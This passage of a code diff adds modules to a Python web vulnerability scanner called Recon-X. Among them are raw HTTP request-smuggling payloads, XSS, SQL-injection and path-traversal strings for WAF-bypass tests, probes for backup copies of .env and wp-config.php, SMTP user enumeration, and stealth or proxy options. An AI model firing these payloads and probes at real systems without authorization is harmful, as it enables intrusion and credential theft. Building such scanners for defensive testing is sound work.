+            p_bad(r["attack"], f"{r['header']}: {r['value']} (HTTP {r['status']})")
+    else:
+        p_ok("Host header (deep)", "no reflection/bypass found")
+
+def run_cookie_injection(ctx, url, args):
+    p_section("Cookie Injection", "60")
+    ctx["modules_run"].append("cookie_injection")
+    res = test_cookie_injection(url, timeout=args.timeout)
+    ctx["cookie_injection"] = res
+    reflected = [r for r in res if r["reflected"]]
+    if reflected:
+        for r in reflected:
+            p_bad(r["cookie"], "REFLECTED in response")
+    else:
+        p_ok("Cookie injection", "no cookies reflected")
+
+def run_session_fixation(ctx, url, args):
+    p_section("Session Fixation", "61")
+    ctx["modules_run"].append("session_fixation")
+    res = test_session_fixation(url, timeout=args.timeout)
+    ctx["session_fixation"] = res
+    if res.get("session_fixation"):
+        p_bad("Session", "session ID not changed (fixation possible)")
+    else:
+        p_ok("Session", "session ID changed or no session cookie")
+
+def run_content_type_sniff(ctx, url, args):
+    p_section("Content-Type Sniffing", "62")
+    ctx["modules_run"].append("content_type_sniff")
+    res = test_content_type_sniffing(url, timeout=args.timeout)
+    ctx["content_type_sniff"] = res
+    if res["sniffing_possible"]:
+        p_warn("Sniffing", f"possible (X-Content-Type-Options: {res['x_content_type_options'] or 'missing'})")
+    else:
+        p_ok("Sniffing", "nosniff present")
+
+def run_cors_deep2(ctx, url, args):
+    p_section("CORS Deep Testing", "63")
+    ctx["modules_run"].append("cors_deep2")
+    res = test_cors_deep(url, timeout=args.timeout)
+    ctx["cors_deep2"] = res
+    dangerous = [r for r in res if r["dangerous"]]
+    if dangerous:
+        for r in dangerous:
+            p_bad(r["origin"], "DANGEROUS: reflected + credentials")
+    else:
+        reflected = [r for r in res if r["reflected"]]
+        if reflected:
+            for r in reflected:
+                p_warn(r["origin"], f"reflected (acao={r['acao']}) but no credentials")
+        else:
+            p_ok("CORS deep", "no origin reflection across " + str(len(res)) + " tests")
+
+def run_cloud_metadata(ctx, url, args):
+    p_section("Cloud Metadata SSRF", "64")
+    ctx["modules_run"].append("cloud_metadata")
+    res = test_cloud_metadata(url, timeout=args.timeout)
+    ctx["cloud_metadata"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], "cloud metadata accessible via SSRF")
+    else:
+        p_ok("Cloud metadata", "no SSRF found")
+
+def run_oauth(ctx, url, args):
+    p_section("OAuth/OIDC Misconfiguration", "65")
+    ctx["modules_run"].append("oauth")
+    res = test_oauth(url, timeout=args.timeout)
+    ctx["oauth"] = res
+    bypass = [r for r in res if r.get("redirect_uri_bypass")]
+    if bypass:
+        for r in bypass:
+            p_bad(r["path"], "redirect_uri bypass possible")
+    configs = [r for r in res if r.get("openid_config")]
+    if configs:
+        for r in configs:
+            p_ok(r["path"], "OpenID configuration found")
+    if not bypass and not configs:
+        p_ok("OAuth", "no OAuth/OIDC endpoints found or misconfigured")
+
+def run_s3_deep(ctx, host, args):
+    p_section("S3 Bucket Enumeration (Deep)", "66")
+    ctx["modules_run"].append("s3_deep")
+    if is_ip(host):
+        p_note("S3 deep", "not measured - target is an IP")
+        ctx["s3_deep"] = []
+        return
+    res = test_s3_deep(host, timeout=args.timeout)
+    ctx["s3_deep"] = res
+    if res:
+        for r in res:
+            flags = []
+            if r.get("listable"):
+                flags.append("LISTABLE")
+            if r.get("acl_exposed"):
+                flags.append("ACL EXPOSED")
+            p_bad(r["bucket"], " -> ".join(flags) if flags else "exists (HTTP " + str(r["status"]) + ")")
+    else:
+        p_ok("S3 deep", "no buckets found")
+
+def run_tech_versions(ctx, url, args):
+    p_section("Technology Version Detection", "67")
+    ctx["modules_run"].append("tech_versions")
+    resp = ctx.get("http_resp")
+    if not resp or not ctx.get("http_ok"):
+        p_note("Tech versions", "not measured - no HTTP response")
+        ctx["tech_versions"] = []
+        return
+    res = detect_tech_versions(resp)
+    ctx["tech_versions"] = res
+    if res:
+        for r in res:
+            p_ok(r["tech"], r["version"])
+    else:
+        p_ok("Tech versions", "no version numbers detected")
+
+def run_dns_rebinding(ctx, host, args):
+    p_section("DNS Rebinding Check", "68")
+    ctx["modules_run"].append("dns_rebinding")
+    if is_ip(host):
+        p_note("DNS rebinding", "not measured - target is an IP")
+        ctx["dns_rebinding"] = None
+        return
+    res = check_dns_rebinding(host, timeout=args.timeout)
+    ctx["dns_rebinding"] = res
+    if res["rebinding_possible"]:
+        p_bad("DNS rebinding", res["details"])
+    else:
+        p_ok("DNS rebinding", res["details"])
+
+# ================= PROXY / STEALTH / THROTTLE RUNNER =================
+def run_proxy_stealth(ctx, args):
+    global PROXY_URL
+    p_section("Proxy / Stealth / Throttle", "69")
+    ctx["modules_run"].append("proxy_stealth")
+    # Check environment
+    proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy") or os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
+    if proxy:
+        PROXY_URL = proxy
+        _apply_proxy()
+        p_ok("Proxy", proxy)
+    else:
+        p_note("Proxy", "not configured (set HTTP_PROXY/HTTPS_PROXY env vars)")
+    if STEALTH_MODE:
+        p_ok("Stealth mode", "enabled (randomized delays 0.5-2.5s)")
+    else:
+        p_note("Stealth mode", "disabled (use --stealth flag)")
+    if THROTTLE_DELAY > 0:
+        p_ok("Throttle", f"{THROTTLE_DELAY}s delay between requests")
+    else:
+        p_note("Throttle", "disabled (use --delay N)")
+
+# ================= RESUME / DIFF SUPPORT =================
+def save_scan_state(ctx, filepath):
+    """Save scan state for resume capability."""
+    try:
+        state = {"timestamp": datetime.datetime.now().isoformat(),
+                 "target": ctx.get("target"), "url": ctx.get("url"),
+                 "modules_run": ctx.get("modules_run", []),
+                 "partial": True}
+        with open(filepath, "w", encoding="utf-8") as f:
+            json.dump(state, f, indent=2, default=str)
+        return True
+    except Exception:
+        return False
+
+def load_scan_state(filepath):
+    """Load saved scan state."""
+    try:
+        with open(filepath, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return None
+
+def diff_scans(scan1_path, scan2_path):
+    """Compare two scan reports and show differences."""
+    try:
+        s1 = json.load(open(scan1_path, encoding="utf-8"))
+        s2 = json.load(open(scan2_path, encoding="utf-8"))
+    except Exception as e:
+        return {"error": str(e)}
+    diff = {"added": [], "removed": [], "changed": []}
+    # Compare open ports
+    p1 = set(s1.get("open_ports", []))
+    p2 = set(s2.get("open_ports", []))
+    if p1 != p2:
+        diff["added"].append({"field": "open_ports", "added": sorted(p2 - p1), "removed": sorted(p1 - p2)})
+    # Compare exposed paths
+    e1 = {p.get("path") for p in (s1.get("exposed_paths") or [])}
+    e2 = {p.get("path") for p in (s2.get("exposed_paths") or [])}
+    if e1 != e2:
+        diff["added"].append({"field": "exposed_paths", "added": sorted(e2 - e1), "removed": sorted(e1 - e2)})
+    # Compare score
+    sc1 = (s1.get("score") or {}).get("percent", 0)
+    sc2 = (s2.get("score") or {}).get("percent", 0)
+    if sc1 != sc2:
+        diff["changed"].append({"field": "score_percent", "old": sc1, "new": sc2})
+    # Compare vuln count
+    v1 = len(s1.get("vuln_inventory", []) or [])
+    v2 = len(s2.get("vuln_inventory", []) or [])
+    if v1 != v2:
+        diff["changed"].append({"field": "vuln_count", "old": v1, "new": v2})
+    # Compare subdomains
+    sub1 = {s.get("name") if isinstance(s, dict) else str(s) for s in (s1.get("subdomains") or [])}
+    sub2 = {s.get("name") if isinstance(s, dict) else str(s) for s in (s2.get("subdomains") or [])}
+    if sub1 != sub2:
+        diff["added"].append({"field": "subdomains", "added": sorted(sub2 - sub1), "removed": sorted(sub1 - sub2)})
+    return diff
+
+# ================= MULTI-TARGET SCAN =================
+def run_multi_target(targets, args):
+    """Scan multiple targets sequentially."""
+    results = []
+    for i, target in enumerate(targets, 1):
+        p_section(f"Target {i}/{len(targets)}: {target}", ">>")
+        # Reuse main logic by calling run functions
+        # For simplicity, just run a quick scan per target
+        url = normalize_url(target)
+        if not url:
+            continue
+        host = get_host(url)
+        if not host:
+            continue
+        parsed = urlparse(url)
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        ctx = {"target": target, "url": url, "host": host, "modules_run": [],
+               "open_ports": [], "exposed_paths": [], "dns_ips": []}
+        # Run key modules only for multi-target
+        for name, fn in [("http", lambda: run_http(ctx, url, args)),
+                         ("tls", lambda: run_tls(ctx, host, port, args)),
+                         ("headers", lambda: run_headers(ctx, url, args)),
+                         ("paths", lambda: run_paths(ctx, url, args) if args.paths else None),
+                         ("score", lambda: run_score(ctx))]:
+            try:
+                fn()
+            except Exception as e:
+                p_warn(f"module {name}", str(e))
+        results.append({"target": target, "url": url, "score": ctx.get("score")})
+    return results
+
+# ================= HTTP REQUEST SMUGGLING (CL.TE / TE.CL) =================
+def test_http_smuggling(url, timeout=10):
+    """Live: probe for HTTP request smuggling (CL.TE and TE.CL)."""
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    results = []
+    
+    # CL.TE probe: send Content-Length and Transfer-Encoding together
+    # If the server processes CL first, the TE body is treated as a separate request
+    cl_te_payload = (
+        f"POST {parsed.path or '/'} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: 4\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"\r\n"
+        f"1\r\n"
+        f"Z\r\n"
+        f"0\r\n"
+        f"\r\n"
+    )
+    
+    # TE.CL probe: send Transfer-Encoding and Content-Length together
+    te_cl_payload = (
+        f"POST {parsed.path or '/'} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"Content-Length: 6\r\n"
+        f"\r\n"
+        f"0\r\n"
+        f"\r\n"
+        f"X"
+    )
+    
+    for name, payload in [("CL.TE", cl_te_payload), ("TE.CL", te_cl_payload)]:
+        try:
+            import ssl as _s
+            if parsed.scheme == "https":
+                ctx = _s.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = _s.CERT_NONE
+                with socket.create_connection((host, port), timeout=timeout) as sock:
+                    with ctx.wrap_socket(sock, server_hostname=host) as ss:
+                        ss.sendall(payload.encode())
+                        time.sleep(2)
+                        data = ss.recv(4096)
+            else:
+                with socket.create_connection((host, port), timeout=timeout) as sock:
+                    sock.sendall(payload.encode())
+                    time.sleep(2)
+                    data = sock.recv(4096)
+            text = data.decode("utf-8", errors="ignore")
+            # If we get a 400 or the connection behaves differently, might be vulnerable
+            vulnerable = ("400" in text or "500" in text or 
+                          "transfer-encoding" in text.lower() or
+                          len(text) > 100)
+            results.append({"type": name, "status_line": text.split("\r\n")[0] if text else "",
+                            "response_length": len(text), "vulnerable": vulnerable,
+                            "raw_preview": text[:200]})
+        except Exception as e:
+            results.append({"type": name, "status_line": "", "response_length": 0,
+                            "vulnerable": False, "error": clean_error(e)})
+    return results
+
+# ================= PROXY SUPPORT =================
+def configure_proxy(proxy_url):
+    """Configure HTTP/SOCKS proxy for all requests."""
+    global PROXY_URL
+    if proxy_url:
+        PROXY_URL = proxy_url
+        os.environ["HTTP_PROXY"] = proxy_url
+        os.environ["HTTPS_PROXY"] = proxy_url
+        os.environ["http_proxy"] = proxy_url
+        os.environ["https_proxy"] = proxy_url
+        # For SOCKS proxies
+        if proxy_url.startswith("socks"):
+            try:
+                import socks
+                import socket as _socket
+                # Parse proxy URL
+                from urllib.parse import urlparse as _up
+                parsed = _up(proxy_url)
+                socks.set_default_proxy(socks.SOCKS5, parsed.hostname, parsed.port or 1080)
+                _socket.socket = socks.socksocket
+            except ImportError:
+                pass  # PySocks not installed
+        return True
+    return False
+
+# ================= HTML REPORT EXPORT =================
+def export_html_report(ctx, filepath):
+    """Export scan results as an HTML report with charts and styling."""
+    score = ctx.get("score", {}) or {}
+    vulns = ctx.get("vuln_inventory", []) or []
+    
+    # Count severities
+    from collections import Counter
+    sev_counts = Counter(v.get("severity", "Info") for v in vulns)
+    
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Recon-X Report - {ctx.get('target', 'Unknown')}</title>
+<style>
+body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
+.container {{ max-width: 1200px; margin: 0 auto; }}
+h1 {{ color: #58a6ff; border-bottom: 2px solid #58a6ff; padding-bottom: 10px; }}
+h2 {{ color: #79c0ff; margin-top: 30px; }}
+h3 {{ color: #a5d6ff; }}
+.card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin: 10px 0; }}
+.score {{ font-size: 48px; font-weight: bold; text-align: center; padding: 20px; }}
+.grade-A {{ color: #3fb950; }} .grade-B {{ color: #58a6ff; }} .grade-C {{ color: #d29922; }}
+.grade-D {{ color: #f85149; }} .grade-F {{ color: #f85149; }}
+.vuln {{ border-left: 4px solid; padding: 10px; margin: 5px 0; background: #161b22; }}
+.vuln-Critical {{ border-color: #f85149; }} .vuln-High {{ border-color: #f0883e; }}
+.vuln-Medium {{ border-color: #d29922; }} .vuln-Low {{ border-color: #58a6ff; }}
+table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
+th, td {{ border: 1px solid #30363d; padding: 8px; text-align: left; }}
+th {{ background: #21262d; color: #58a6ff; }}
+tr:nth-child(even) {{ background: #161b22; }}
+.badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }}
+.badge-Critical {{ background: #f85149; color: white; }}
+.badge-High {{ background: #f0883e; color: white; }}
+.badge-Medium {{ background: #d29922; color: black; }}
+.badge-Low {{ background: #58a6ff; color: white; }}
+.stat {{ display: inline-block; margin: 10px; text-align: center; }}
+.stat-num {{ font-size: 32px; font-weight: bold; }}
+.stat-label {{ font-size: 12px; color: #8b949e; }}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Recon-X v4.0 - Security Report</h1>
+<div class="card">
+<p><strong>Target:</strong> {ctx.get('target', 'N/A')}</p>
+<p><strong>URL:</strong> {ctx.get('url', 'N/A')}</p>
+<p><strong>Timestamp:</strong> {ctx.get('timestamp', 'N/A') if 'timestamp' in ctx else 'N/A'}</p>
+<p><strong>Modules Run:</strong> {len(ctx.get('modules_run', []))}</p>
+</div>
+
+<h2>Security Score</h2>
+<div class="card">
+<div class="score grade-{score.get('grade', 'F')[0]}">{score.get('score', 0)}/{score.get('max', 0)} ({score.get('percent', 0)}%) - Grade {score.get('grade', 'F')}</div>
+</div>
+
+<h2>Vulnerability Summary</h2>
+<div class="card">
+"""
+    for sev in ("Critical", "High", "Medium", "Low"):
+        n = sev_counts.get(sev, 0)
+    sev_colors = {"Critical": "#f85149", "High": "#f0883e", "Medium": "#d29922", "Low": "#58a6ff"}
+    for sev in ("Critical", "High", "Medium", "Low"):
+        n = sev_counts.get(sev, 0)
+        color = sev_colors.get(sev, "#c9d1d9")
+        html += f'<div class="stat"><div class="stat-num" style="color: {color}">{n}</div><div class="stat-label">{sev}</div></div>\n'
+    html += f'<div class="stat"><div class="stat-num">{len(vulns)}</div><div class="stat-label">Total</div></div>\n'
+    html += "</div>\n"
+    
+    html += "<h2>Vulnerability Inventory</h2>\n"
+    for i, v in enumerate(vulns, 1):
+        sev = v.get("severity", "Low")
+        html += f'<div class="vuln vuln-{sev}">\n'
+        html += f'<strong>{i}. {v.get("title", "Unknown")}</strong> <span class="badge badge-{sev}">{sev}</span><br>\n'
+        html += f'<small>Source: {v.get("source", "N/A")} | Location: {v.get("location", "N/A")}</small><br>\n'
+        if v.get("evidence"):
+            html += f'<small>Evidence: {v.get("evidence", "")}</small>\n'
+        html += "</div>\n"
+    
+    # Open ports
+    ports = ctx.get("open_ports", [])
+    if ports:
+        html += "<h2>Open Ports</h2>\n<div class=\"card\"><table><tr><th>Port</th><th>Service</th></tr>\n"
+        for p in ports:
+            svc = SERVICE_MAP.get(p, "unknown") if 'SERVICE_MAP' in globals() else "unknown"
+            html += f"<tr><td>{p}</td><td>{svc}</td></tr>\n"
+        html += "</table></div>\n"
+    
+    # Technologies
+    tech = ctx.get("tech", [])
+    if tech:
+        html += "<h2>Technologies Detected</h2>\n<div class=\"card\"><table><tr><th>Technology</th><th>Match</th></tr>\n"
+        for t in tech:
+            html += f"<tr><td>{t.get('name', '')}</td><td>{t.get('match', '')}</td></tr>\n"
+        html += "</table></div>\n"
+    
+    # Subdomains
+    subs = ctx.get("subdomains", [])
+    if subs:
+        html += f"<h2>Subdomains ({len(subs)})</h2>\n<div class=\"card\"><table><tr><th>Name</th><th>IP</th><th>Status</th></tr>\n"
+        for s in subs[:50]:
+            name = s.get("name", str(s)) if isinstance(s, dict) else str(s)
+            ip = s.get("ip", "") if isinstance(s, dict) else ""
+            status = s.get("status", "") if isinstance(s, dict) else ""
+            html += f"<tr><td>{name}</td><td>{ip}</td><td>{status}</td></tr>\n"
+        html += "</table></div>\n"
+    
+    # DNS
+    dns_data = ctx.get("dns", {})
+    if dns_data and dns_data.get("records"):
+        html += "<h2>DNS Records</h2>\n<div class=\"card\"><table><tr><th>Type</th><th>Values</th></tr>\n"
+        for rtype, vals in dns_data.get("records", {}).items():
+            if vals:
+                html += f"<tr><td>{rtype}</td><td>{', '.join(str(v) for v in vals[:10])}</td></tr>\n"
+        html += "</table></div>\n"
+    
+    html += """
+<div class="card" style="text-align: center; color: #8b949e;">
+<p>Generated by Recon-X v4.0 | For authorized security testing only</p>
+</div>
+</div>
+</body>
+</html>"""
+    
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.write(html)
+    return True
+
+# ================= SMTP EMAIL ENUMERATION =================
+def smtp_enum(host, timeout=10):
+    """Live: enumerate emails via SMTP VRFY/RCPT TO."""
+    import socket as _sock
+    results = {"vrfy": [], "rcpt": [], "catch_all": False, "server_banner": ""}
+    try:
+        with _sock.create_connection((host, 25), timeout=timeout) as s:
+            s.settimeout(timeout)
+            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
+            results["server_banner"] = banner
+            s.sendall(b"HELO reconx.local\r\n")
+            s.recv(1024)
+            # Test VRFY
+            for user in ["admin", "root", "info", "support", "webmaster", "postmaster", "test"]:
+                s.sendall(f"VRFY {user}\r\n".encode())
+                resp = s.recv(1024).decode("utf-8", errors="ignore").strip()
+                if "250" in resp or "252" in resp:
+                    results["vrfy"].append({"user": user, "response": resp})
+            # Test RCPT TO (catch-all detection)
+            s.sendall(b"MAIL FROM:<reconx@test.com>\r\n")
+            s.recv(1024)
+            s.sendall(b"RCPT TO:<nonexistent12345@test.com>\r\n")
+            resp = s.recv(1024).decode("utf-8", errors="ignore").strip()
+            if "250" in resp:
+                results["catch_all"] = True
+            s.sendall(b"QUIT\r\n")
+    except Exception as e:
+        results["error"] = str(e)
+    return results
+
+# ================= BACKUP FILE DETECTION (DEEP) =================
+BACKUP_EXTENSIONS = [".bak", ".old", ".orig", ".backup", ".save", ".swp", ".tmp",
+                     ".copy", ".old", ".orig", ".bakup", ".bk", ".bkp"]
+BACKUP_PATHS = ["/.env", "/config.php", "/wp-config.php", "/settings.py",
+                "/application.properties", "/web.config", "/.htaccess",
+                "/database.yml", "/config.yml", "/config.json", "/secrets.yml"]
+
+def detect_backups(base_url, timeout=6):
+    """Live: probe for backup copies of sensitive files."""
+    parsed = urlparse(base_url)
+    root = f"{parsed.scheme}://{parsed.netloc}"
+    found = []
+    for path in BACKUP_PATHS:
+        for ext in BACKUP_EXTENSIONS[:8]:
+            test_url = root + path + ext
+            r = http_request(test_url, timeout=timeout, method="HEAD")
+            if r.get("ok") and r.get("status") == 200:
+                found.append({"path": path + ext, "url": test_url,
+                              "status": r.get("status"), "size": r.get("headers", {}).get("content-length", "?")})
+            # Also try ~ suffix
+            test_url2 = root + path + "~"
+            r2 = http_request(test_url2, timeout=timeout, method="HEAD")
+            if r2.get("ok") and r2.get("status") == 200:
+                found.append({"path": path + "~", "url": test_url2,
+                              "status": r2.get("status"), "size": r2.get("headers", {}).get("content-length", "?")})
+    # dedupe
+    seen = set()
+    out = []
+    for f in found:
+        if f["url"] not in seen:
+            seen.add(f["url"])
+            out.append(f)
+    return out
+
+# ================= SUBDOMAIN PERMUTATION =================
+PERMUTATION_PREFIXES = ["dev", "staging", "test", "prod", "api", "admin", "beta",
+                        "v1", "v2", "v3", "old", "new", "backup", "internal",
+                        "secure", "login", "portal", "app", "web", "mail"]
+
+def permute_subdomains(domain, known_subs, timeout=5, workers=20):
+    """Live: generate subdomain permutations from known subdomains and resolve."""
+    found = []
+    candidates = set()
+    for sub in known_subs:
+        name = sub.get("name") if isinstance(sub, dict) else str(sub)
+        if not name:
+            continue
+        # Extract the prefix (first part before domain)
+        prefix = name.replace("." + domain, "").split(".")[0]
+        for perm in PERMUTATION_PREFIXES:
+            candidates.add(f"{perm}-{prefix}.{domain}")
+            candidates.add(f"{prefix}-{perm}.{domain}")
+            candidates.add(f"{perm}{prefix}.{domain}")
+            candidates.add(f"{prefix}{perm}.{domain}")
+    # Resolve all
+    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
+        futures = {pool.submit(resolve_hostname, c): c for c in candidates}
+        for fut in as_completed(futures):
+            try:
+                r = fut.result()
+                if r.get("ip"):
+                    found.append(r)
+            except Exception:
+                pass
+    found.sort(key=lambda x: x["name"])
+    return found
+
+# ================= WAF BYPASS DETECTION =================
+WAF_BYPASS_PAYLOADS = [
+    ("<script>alert(1)</script>", "XSS basic"),
+    ("<ScRiPt>alert(1)</ScRiPt>", "XSS case variation"),
+    ("<script>alert(String.fromCharCode(88,83,83))</script>", "XSS encoding"),
+    ("' OR 1=1--", "SQLi basic"),
+    ("' OR '1'='1", "SQLi quote"),
+    ("../../../etc/passwd", "Path traversal"),
+    ("<img src=x onerror=alert(1)>", "XSS img"),
+]
+
+def test_waf_bypass(url, timeout=8):
+    """Live: test if WAF can be bypassed with common evasion techniques."""
+    results = []
+    for payload, desc in WAF_BYPASS_PAYLOADS:
+        # Test in query parameter
+        test_url = f"{url}?q={quote(payload, safe='')}"
+        r = http_request(test_url, timeout=timeout, allow_redirects=False)
+        status = r.get("status", 0)
+        blocked = status in (403, 406, 429, 503) or "blocked" in (r.get("body") or "").lower()
+        results.append({"payload": desc, "status": status, "blocked": blocked,
+                        "bypassed": not blocked and status == 200})
+    return results
+
+# ================= TECHNOLOGY CVE LOOKUP =================
+def lookup_cves(tech_versions, timeout=10):
+    """Live: look up CVEs for detected technology versions via NVD API."""
+    results = []
+    for tv in (tech_versions or []):
+        tech = tv.get("tech", "")
+        version = tv.get("version", "")
+        if not tech or not version:
+            continue
+        try:
+            # Use NVD API (free, no key needed for basic search)
+            query = f"{tech} {version}"
+            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={quote(query)}&resultsPerPage=5"
+            r = http_request(url, timeout=timeout)
+            if r.get("ok") and r.get("status") == 200:
+                data = json.loads(r.get("body") or "{}")
+                vulns = data.get("vulnerabilities", [])
+                cves = []
+                for v in vulns[:5]:
+                    cve = v.get("cve", {})
+                    cve_id = cve.get("id", "")
+                    desc = ""
+                    for d in cve.get("descriptions", []):
+                        if d.get("lang") == "en":
+                            desc = d.get("value", "")[:100]
+                            break
+                    metrics = cve.get("metrics", {})
+                    cvss = 0
+                    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
+                        if k in metrics and metrics[k]:
+                            cvss = metrics[k][0].get("cvssData", {}).get("baseScore", 0)
+                            break
+                    cves.append({"id": cve_id, "cvss": cvss, "description": desc})
+                if cves:
+                    results.append({"tech": tech, "version": version, "cves": cves})
+        except Exception:
+            pass
+    return results
+
+# ================= RUNNERS =================
+
+def run_http_smuggling(ctx, url, args):
+    p_section("HTTP Request Smuggling", "70")
+    ctx["modules_run"].append("http_smuggling")
+    res = test_http_smuggling(url, timeout=args.timeout)
+    ctx["http_smuggling"] = res
+    vulns = [r for r in res if r.get("vulnerable")]
+    if vulns:
+        for r in vulns:
+            p_bad(r["type"], f"possible smuggling (HTTP {r.get('status_line', '')})")
+    else:
+        p_ok("HTTP smuggling", "no desync detected")
+
+def run_html_report(ctx, url, args):
+    p_section("HTML Report Export", "72")
+    ctx["modules_run"].append("html_report")
+    filepath = args.output.replace(".json", ".html") if args.output else "report.html"
+    try:
+        export_html_report(ctx, filepath)
+        p_ok("HTML report", f"saved to {filepath}")
+        ctx["html_report"] = filepath
+    except Exception as e:
+        p_bad("HTML report", str(e))
+        ctx["html_report"] = None
+
+def run_smtp_enum(ctx, host, args):
+    p_section("SMTP Email Enumeration", "73")
+    ctx["modules_run"].append("smtp_enum")
+    if is_ip(host):
+        p_note("SMTP enum", "not measured - target is an IP")
+        ctx["smtp_enum"] = None
+        return
+    # Try to find MX records and enumerate
+    res = smtp_enum(host, timeout=args.timeout)
+    ctx["smtp_enum"] = res
+    if res.get("error"):
+        p_note("SMTP", res["error"])
+        return
+    if res.get("server_banner"):
+        p_ok("SMTP banner", shorten(res["server_banner"], 80))
+    if res.get("vrfy"):
+        p_ok("VRFY users", len(res["vrfy"]))
+        for v in res["vrfy"]:
+            p_ok(f"  {v['user']}", v["response"][:60])
+    if res.get("catch_all"):
+        p_warn("Catch-all", "server accepts mail for any address")
+    if not res.get("vrfy") and not res.get("catch_all"):
+        p_ok("SMTP enum", "no users enumerated")
+
+def run_backup_files(ctx, url, args):
+    p_section("Backup File Detection (Deep)", "74")
+    ctx["modules_run"].append("backup_files")
+    resp = ctx.get("http_resp")
+    if not resp or not ctx.get("http_ok"):
+        p_note("Backups", "not measured - no HTTP response")
+        ctx["backup_files"] = []
+        return
+    found = detect_backups(url, timeout=args.timeout)
+    ctx["backup_files"] = found
+    if found:
+        for f in found:
+            p_bad(f["path"], f"HTTP {f['status']} ({f['size']} bytes)")
+    else:
+        p_ok("Backups", "no backup files found")
+
+def run_subdomain_permutation(ctx, host, args):
+    p_section("Subdomain Permutation", "75")
+    ctx["modules_run"].append("subdomain_permutation")
+    if is_ip(host):
+        p_note("Permutation", "not measured - target is an IP")
+        ctx["subdomain_permutation"] = []
+        return
+    subs = ctx.get("subdomains") or []
+    if not subs:
+        p_note("Permutation", "not measured - no subdomains enumerated")
+        ctx["subdomain_permutation"] = []
+        return
+    found = permute_subdomains(host, subs, timeout=args.timeout, workers=args.threads)
+    ctx["subdomain_permutation"] = found
+    if found:
+        p_ok("Permutations found", len(found))
+        for r in found[:20]:
+            p_ok(r["name"], r["ip"])
+        if len(found) > 20:
+            p_note("More", f"{len(found) - 20} additional in JSON report")
+    else:
+        p_ok("Permutation", "no new subdomains found")
+
+def run_waf_bypass(ctx, url, args):
+    p_section("WAF Bypass Detection", "76")
+    ctx["modules_run"].append("waf_bypass")
+    res = test_waf_bypass(url, timeout=args.timeout)
+    ctx["waf_bypass"] = res
+    bypassed = [r for r in res if r["bypassed"]]
+    if bypassed:
+        for r in bypassed:
+            p_bad(r["payload"], "BYPASSED (HTTP " + str(r["status"]) + ")")
+    else:
+        p_ok("WAF bypass", "all payloads blocked")
+
+def run_tech_cve(ctx, url, args):
+    p_section("Technology CVE Lookup", "77")
+    ctx["modules_run"].append("tech_cve")
+    versions = detect_tech_versions(ctx.get("http_resp") or {})
+    ctx["tech_versions"] = versions
+    if not versions:
+        p_note("CVE lookup", "no technology versions detected")
+        ctx["tech_cve"] = []
+        return
+    cves = lookup_cves(versions, timeout=args.timeout)
+    ctx["tech_cve"] = cves
+    if cves:
+        for c in cves:
+            p_bad(c["tech"] + " " + c["version"], f"{len(c['cves'])} CVEs found")
+            for cv in c["cves"][:3]:
+                p_note(f"  {cv['id']}", f"CVSS {cv['cvss']}: {shorten(cv['description'], 60)}", C.GR)
+    else:
+        p_ok("CVE lookup", "no CVEs found for detected versions")
+
+def run_resume_diff(ctx, args):
+    p_section("Resume / Diff", "79")
+    ctx["modules_run"].append("resume_diff")
+    # Save current state
+    state_file = args.output.replace(".json", "_state.json") if args.output else "scan_state.json"
+    if save_scan_state(ctx, state_file):
+        p_ok("State saved", state_file)
+    else:
+        p_note("State", "could not save state file")
+    # Diff if previous scan exists
+    prev_file = state_file.replace("_state.json", "_prev.json")
+    if os.path.exists(prev_file):
+        diff = diff_scans(prev_file, args.output or "report.json")
+        if diff.get("error"):
+            p_note("Diff", diff["error"])
+        else:
+            if diff.get("added"):
+                for d in diff["added"]:
+                    p_warn("Added", f"{d['field']}: {d.get('added', [])}")
+            if diff.get("removed"):
+                for d in diff["removed"]:
+                    p_warn("Removed", f"{d['field']}: {d.get('removed', [])}")
+            if diff.get("changed"):
+                for d in diff["changed"]:
+                    p_warn("Changed", f"{d['field']}: {d.get('old')} -> {d.get('new')}")
+            if not diff.get("added") and not diff.get("removed") and not diff.get("changed"):
+                p_ok("Diff", "no changes detected")
+    else:
+        p_note("Diff", "no previous scan found (run again to compare)")
+
+# ================= HTTP/3 (QUIC) DETECTION =================
+def detect_http3(url, timeout=8):
+    """Live: check if server supports HTTP/3 via Alt-Svc header."""
+    r = http_request(url, timeout=timeout)
+    hdrs = r.get("headers") or {}
+    alt_svc = hdrs.get("alt-svc", "")
+    supported = "h3" in alt_svc.lower() or "quic" in alt_svc.lower()
+    details = alt_svc if alt_svc else "no Alt-Svc header"
+    return {"supported": supported, "alt_svc": alt_svc, "details": details}
+
+# ================= DKIM RECORD LOOKUP =================
+def lookup_dkim(domain, timeout=8):
+    """Live: check for DKIM records (common selectors)."""
+    if not HAS_DNS:
+        return {"selectors": [], "notes": ["dnspython not installed"]}
+    resolver = dns.resolver.Resolver()
+    resolver.timeout = 5
+    resolver.lifetime = 8
+    selectors = ["default", "google", "selector1", "selector2", "mail", "dkim",
+                 "k1", "s1", "s2", "email", "smtp", "mta"]
+    found = []
+    for sel in selectors:
